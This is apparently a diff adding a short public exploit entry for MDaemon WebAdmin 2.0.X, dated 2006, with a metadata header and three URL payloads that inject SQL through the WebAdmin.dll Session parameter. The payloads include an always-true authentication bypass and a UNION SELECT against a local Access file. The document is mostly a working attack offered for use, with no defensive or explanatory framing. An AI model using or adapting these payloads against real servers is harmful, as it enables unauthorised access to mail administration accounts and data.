@@ -1,0 +1,14 @@
+# Exploit Title: MDaemon WebAdmin 2.0.X SQL injection
+# Date: 2006/5/26
+# Author: KOUSULIN
+# Software Link: http://archive.altn.com/WebAdmin/Archive/2.0.8/wa208_en.exe
+# Version: WebAdmin 2.0.X
+# Tested on: Windows 2003
+# CVE : N/A
+# Code :
+
+/WebAdmin.dll?Session='[ACCESS SQL INJ]&View=User
+
+/WebAdmin.dll?Session='or''='&View=User  # need a active session
+
+/WebAdmin.dll?Session='UNION SELECT * FROM A IN 'C:\ZZZ' WHERE ''='&View=User
